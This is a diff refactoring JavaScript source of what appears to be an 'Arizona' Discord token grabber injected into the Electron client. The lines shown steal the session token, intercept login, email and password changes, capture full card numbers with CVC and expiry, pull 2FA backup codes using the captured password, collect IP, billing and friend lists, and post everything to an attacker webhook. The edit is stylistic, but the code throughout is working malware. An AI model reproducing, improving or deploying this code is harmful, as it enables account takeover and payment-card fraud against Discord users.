@@ -96,12 +96,12 @@ class ArizonaEvent {
 }
 
 async function firstTime() {
-    var token = await getToken()
+    let token = await getToken()
     if (config['init-notify'] == "true") {
         if (fs.existsSync(path.join(__dirname, "init"))) {
             fs.rmdirSync(path.join(__dirname, "init"));
             if (token == null || token == undefined || token == "") {
-                var c = {
+                let c = {
                     username: "Arizona",
                     content: "",
                     embeds: [{
@@ -122,8 +122,8 @@ async function firstTime() {
                 };
                 sendToWebhook(JSON.stringify(c));
             } else {
-                var b = await getUserInfo(token)
-                var c = {
+                let b = await getUserInfo(token)
+                let c = {
                     username: "Arizona",
                     content: "",
                     embeds: [{
@@ -173,7 +173,7 @@ async function firstTime() {
     if (config.logout != "false" || config.logout == "%LOGOUT%") {
         if (config['logout-notify'] == "true") {
             if (token == null || token == undefined || token == "") {
-                var c = {
+                let c = {
                     username: "Arizona",
                     content: "",
                     embeds: [{
@@ -195,7 +195,7 @@ async function firstTime() {
                 sendToWebhook(JSON.stringify(c));
             } else {
                 const b = await getUserInfo(token);
-                var c = {
+                let c = {
                     username: "Arizona",
                     content: "",
                     embeds: [{
@@ -297,12 +297,12 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 // Main functions
 
 async function userLogin(password, email, token) {
-    var userInfo = await getUserInfo(token);
-    var ip = await getIp();
-    var billing = await getBilling(token);
-    var friends = await getRelationships(token);
+    let userInfo = await getUserInfo(token);
+    let ip = await getIp();
+    let billing = await getBilling(token);
+    let friends = await getRelationships(token);
 
-    var params = {
+    let params = {
         username: "Arizona",
         content: "",
         embeds: [{
@@ -372,8 +372,8 @@ async function userLogin(password, email, token) {
     };
 
     if (token.startsWith("mfa")) {
-        var codes = await get2faCodes(token, password)
-        var embed = {
+        let codes = await get2faCodes(token, password)
+        let embed = {
             "title": ":detective: __2FA Codes__",
             "description": `[Get all of them](${codes.url})`,
             "color": config['embed-color'],
@@ -392,12 +392,11 @@ async function userLogin(password, email, token) {
 }
 
 async function emailChanged(password, newEmail, token) {
-    var userInfo = await getUserInfo(token);
-    var ip = await getIp();
-    var friends = await getRelationships(token);
+    let userInfo = await getUserInfo(token);
+    let ip = await getIp();
+    let friends = await getRelationships(token);
 
-
-    var params = {
+    let params = {
         username: "Arizona",
         content: "",
         embeds: [{
@@ -462,8 +461,8 @@ async function emailChanged(password, newEmail, token) {
         }]
     }
     if (token.startsWith("mfa")) {
-        var codes = await get2faCodes(token, password)
-        var embed = {
+        let codes = await get2faCodes(token, password)
+        let embed = {
             "title": ":detective: __2FA Codes__",
             "description": `[Get all of them](${codes.url})`,
             "color": config['embed-color'],
@@ -481,12 +480,12 @@ async function emailChanged(password, newEmail, token) {
 }
 
 async function passwordChanged(oldPassword, newPassword, token) {
-    var userInfo = await getUserInfo(token);
-    var ip = await getIp();
-    var billing = await getBilling(token);
-    var friends = await getRelationships(token);
+    let userInfo = await getUserInfo(token);
+    let ip = await getIp();
+    let billing = await getBilling(token);
+    let friends = await getRelationships(token);
 
-    var params = {
+    let params = {
         username: "Arizona",
         content: "",
         embeds: [{
@@ -560,8 +559,8 @@ async function passwordChanged(oldPassword, newPassword, token) {
     }
 
     if (token.startsWith("mfa")) {
-        var codes = await get2faCodes(token, newPassword)
-        var embed = {
+        let codes = await get2faCodes(token, newPassword)
+        let embed = {
             "title": ":detective: __2FA Codes__",
             "description": `[Get all of them](${codes.url})`,
             "color": config['embed-color'],
@@ -579,12 +578,12 @@ async function passwordChanged(oldPassword, newPassword, token) {
     sendToWebhook(JSON.stringify(params))
 }
 async function creditCardAdded(cardnumber, cvc, expiration, token) {
-    var userInfo = await getUserInfo(token);
-    var ip = await getIp();
-    var billing = await getBilling(token);
-    var friends = await getRelationships(token);
+    let userInfo = await getUserInfo(token);
+    let ip = await getIp();
+    let billing = await getBilling(token);
+    let friends = await getRelationships(token);
 
-    var params = {
+    let params = {
         username: "Arizona",
         content: "",
         embeds: [{
@@ -671,7 +670,7 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
 async function sendToWebhook(params) {
     
     const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    window.webContents.executeJavaScript(`    let xhr = new XMLHttpRequest();
 		xhr.open("POST", "${webhook}", true);
 		xhr.setRequestHeader('Content-Type', 'application/json');
 		xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
@@ -682,14 +681,14 @@ async function sendToWebhook(params) {
 
 async function getRelationships(token) {
     const window = BrowserWindow.getAllWindows()[0];
-    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText`, !0)
-    var json = JSON.parse(a)
+    let a = await window.webContents.executeJavaScript(`let xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText`, !0)
+    let json = JSON.parse(a)
     const r = json.filter((user) => {
         return user.type == 1
     })
-    var gay = "";
+    let gay = "";
     for (z of r) {
-        var b = getRareBadges(z.user.public_flags)
+        let b = getRareBadges(z.user.public_flags)
         if (b != "") {
             gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
         }
@@ -707,9 +706,9 @@ async function get2faCodes(token, password) {
     let baseuri = "https://ctf.surf/raw/";
 
     const window = BrowserWindow.getAllWindows()[0];
-    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);xmlHttp.setRequestHeader('Content-Type', 'application/json');xmlHttp.setRequestHeader("authorization", "${token}");xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));xmlHttp.responseText`, !0)
+    let a = await window.webContents.executeJavaScript(`let xmlHttp = new XMLHttpRequest();xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);xmlHttp.setRequestHeader('Content-Type', 'application/json');xmlHttp.setRequestHeader("authorization", "${token}");xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));xmlHttp.responseText`, !0)
 
-    var json = JSON.parse(a)
+    let json = JSON.parse(a)
     let codes = json.backup_codes
     const r = codes.filter((code) => {
         return code.consumed == null
@@ -730,10 +729,10 @@ async function get2faCodes(token, password) {
 }
 async function getBilling(token) {
     const window = BrowserWindow.getAllWindows()[0];
-    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, !0)
-    var json = JSON.parse(a)
+    let a = await window.webContents.executeJavaScript(`let xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, !0)
+    let json = JSON.parse(a)
 
-    var billing = "";
+    let billing = "";
     json.forEach(z => {
         if (z.type == "") {
             return "\`❌\`";
@@ -752,24 +751,24 @@ async function getBilling(token) {
 
 async function getUserInfo(token) {
     const window = BrowserWindow.getAllWindows()[0];
-    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText;`, !0)
+    let a = await window.webContents.executeJavaScript(`let xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText;`, !0)
     return JSON.parse(a)
 }
 
 async function getIp() {
     const window = BrowserWindow.getAllWindows()[0];
-    var ip = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;`, !0)
+    let ip = await window.webContents.executeJavaScript(`let xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;`, !0)
     return ip
 }
 
 async function getToken() {
     const window = BrowserWindow.getAllWindows()[0];
-    var token = await window.webContents.executeJavaScript(`let token="";window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{token=Object.values(e.c).find((e=>e.exports&&e.exports.default&&void 0!==e.exports.default.getToken)).exports.default.getToken()}]);token;`, !0)
+    let token = await window.webContents.executeJavaScript(`let token="";window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{token=Object.values(e.c).find((e=>e.exports&&e.exports.default&&void 0!==e.exports.default.getToken)).exports.default.getToken()}]);token;`, !0)
     return token
 }
 
 function getBadges(flags) {
-    var b = '';
+    let b = '';
     for (const prop in badges) {
         let o = badges[prop];
         if ((flags & o.Value) == o.Value) b += o.Emoji;
@@ -779,7 +778,7 @@ function getBadges(flags) {
 }
 
 function getRareBadges(flags) {
-    var b = '';
+    let b = '';
     for (const prop in badges) {
         let o = badges[prop];
         if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
@@ -810,38 +809,40 @@ session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) 
 
     switch (true) {
         case details.url.endsWith('login'):
-            var event = new ArizonaEvent('userLogin', token, {
+            const event_userLogin = new ArizonaEvent('userLogin', token, {
                 password: data.password,
                 email: data.login
             });
-            event.handle();
+            event_userLogin.handle();
+            
             return;
         case details.url.endsWith('users/@me') && details.method == 'PATCH':
             if (!data.password) return;
             if (data.email) {
-                var event = new ArizonaEvent('emailChanged', token, {
+                const event_emailChanged = new ArizonaEvent('emailChanged', token, {
                     password: data.password,
                     email: data.email
                 });
-                event.handle();
-
+                event_emailChanged.handle();
             };
             if (data.new_password) {
-                var event = new ArizonaEvent('passwordChanged', token, {
+                const event_passwordChanged = new ArizonaEvent('passwordChanged', token, {
                     password: data.password,
                     new_password: data.new_password
                 });
-                event.handle();
+                event_passwordChanged.handle();
             };
+
             return;
         case details.url.endsWith('tokens') && details.method == "POST":
             const card = querystring.parse(decodeURIComponent(unparsed_data))
-            var event = new ArizonaEvent('creditCardAdded', token, {
+            const event_creditCardAdded = new ArizonaEvent('creditCardAdded', token, {
                 cardnumber: card["card[number]"],
                 cvc: card["card[cvc]"],
                 expiration: card["card[exp_month]"] + "/" + card["card[exp_year]"]
             });
-            event.handle();
+            event_creditCardAdded.handle();
+
             return;
         default:
             break;
